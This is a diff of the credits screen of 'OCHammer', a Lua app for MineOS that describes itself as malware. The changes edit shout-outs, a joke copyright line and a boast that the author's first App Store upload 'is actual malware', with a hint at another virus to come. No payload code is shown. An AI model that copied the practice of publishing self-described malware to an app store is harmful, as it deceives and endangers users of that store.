@@ -16,23 +16,23 @@ local function GREETZ()
   setfg(0xFFFFFF)
   gpu.fill(1,1,resx,resy," ")
   
-  -- URTSC, cerealeverymorning, budderman1239, misticks11, blackapples222, SKYandmichael, magicloveyyy, Savageking24463, Unicornloveheartyyaa and cclys on Roblox.com
+  -- URTSC, cerealeverymorning, budderman1239, misticks11, blackapples222, SKYandmichael, magicloveyyy, Savageking24463, Unicornloveheartyyaa, 1tavamamma, bitkasko and cclys on Roblox.com
   
   local stuff_to_say = {
     "OCHammer";
     " ";
     "Copyright (C) Unbox a Computer Software systems Ltd.";
     " ";
-    "Ūnbox a Computer Software systems Ltd. was based off Unbox a Computer wich is the best Roblox game ever.";
+    "Unbox a Computer Software systems Ltd. was based off Unbox a Computer wich is the best Roblox game ever.";
     "There we develop Computers in Roblox, but I added a Twist..";
-    "Our first software pushed to the MineOS app store is actual malware."; --- HINT: our next mineos software product is a winver copy lol
+    "Our first software pushed to the MineOS app store is actual malware."; --- HINT: our next mineos software product is an another virus lol (000.exe)
     " ";
     "OCHammer includes payloads from malware(-s) featured in danooct1's YouTube channel. (MineOS App Store too!)";
     " ";
     "DIRECT ALL HATE TO KIZMO (@KizmoTek on Twitter)"; 
     " ";
     " ";
-    "GREETZ: OCboy3, Chouladalls, Kurhox, SirKamilMarko";
+    "GREETZ: OCboy3, agentfish, Chouladalls, Kurhox, SirKamilMarko";
   }
   
   for i,thing in pairs(stuff_to_say) do
@@ -59,15 +59,14 @@ local function GREETZ()
      computer.pullSignal(0.25) 
   end
 end
+
 -- Why does Carl the NPC want the freaking gun?
 
 -- Greetz.app 
-
 -- Copyright (C) Unbox a Computer Software systems Ltd.
 
+-- free vbucks
 
-
--- roblox slenders are cringe
 
 -- Add a new window to MineOS workspace lol
 local workspace, window, menu = system.addWindow(GUI.titledWindow(1, 1, 60*2, 20*2, " "))
